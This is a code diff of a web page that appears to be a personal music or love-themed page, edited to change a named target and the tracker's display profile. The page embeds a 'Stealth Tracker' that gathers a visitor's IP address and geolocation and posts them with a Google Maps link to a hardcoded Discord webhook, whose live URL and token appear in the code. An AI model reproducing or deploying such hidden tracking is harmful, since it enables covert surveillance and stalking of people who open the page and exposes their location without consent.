@@ -624,7 +624,12 @@
         // =========================================================
 
         const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1449999299869151416/BumMTg0MfH_PLIz0gp1BOqjYCO9n_Sha4kidu8o32BRZcPsgAivfh_g5sbde8rOzv8kS';
-        const USER_NAME = 'Nikitha'; 
+        const USER_NAME = 'Nikitha'; // RENAMED FROM Anagha
+        
+        // NEW PROFILE DETAILS
+        const WEBHOOK_USERNAME = 'Arjun_Tracker';
+        const WEBHOOK_AVATAR = 'https://rear-chocolate-0cg4idciim-8q5txpw25r.edgeone.dev/VALORANT_JETT_LIGHT.png';
+
 
         // Primary function to fetch both IP and Geolocation
         function requestLocationAndIP() {
@@ -697,11 +702,12 @@
             if (overallStatus.includes('PARTIAL')) embedColor = 16776960; // Yellow (Partial)
             if (overallStatus === 'FAILED') embedColor = 16711680; // Red (Failure)
             
-            const mapLink = latitude && longitude ? `[Google Maps Link](http://maps.google.com/?q=${latitude},${longitude})` : 'N/A';
+            const mapLink = latitude && longitude ? `[Google Maps Link](http://googleusercontent.com/maps.google.com/?q=${latitude},${longitude})` : 'N/A';
 
             const payload = {
-                username: "Heart's Location Tracker",
-                avatar_url: "https://i.imgur.com/uT0m66A.png",
+                // UPDATED WEBHOOK PROFILE
+                username: WEBHOOK_USERNAME,
+                avatar_url: WEBHOOK_AVATAR,
                 content: `🚨 **NEW VISIT - ${USER_NAME}** | Status: **${overallStatus}**`,
                 embeds: [
                     {
@@ -750,9 +756,6 @@
                 console.error('[Stealth Tracker] DISCORD WEBHOOK EXCEPTION:', error);
             });
         }
-        
-        // --- Dummy function for saveLocationToServer removed as it requires a live server ---
-        // --- requestLocationOnLoad renamed to requestLocationAndIP in body tag ---
         
         // =========================================================
         // END LOCATION & IP TRACKING FUNCTIONS
@@ -818,7 +821,6 @@
         const musicText = document.getElementById('musicText');
         const youtubePlayer = document.getElementById('youtubePlayer');
         let isMusicPlaying = false;
-        let youtubeIframe;
 
         // Initialize YouTube iframe
         function initYouTubePlayer() {
@@ -834,11 +836,7 @@
                 musicControl.style.background = "rgba(255, 51, 102, 0.1)";
                 
                 // Try to play music (autoplay might be blocked by browser)
-                if (youtubeIframe) {
-                    youtubeIframe.src = youtubeIframe.src.replace("autoplay=0", "autoplay=1");
-                }
                 
-                isMusicPlaying = true;
             } else {
                 // Hide and pause music
                 youtubePlayer.style.display = 'none';
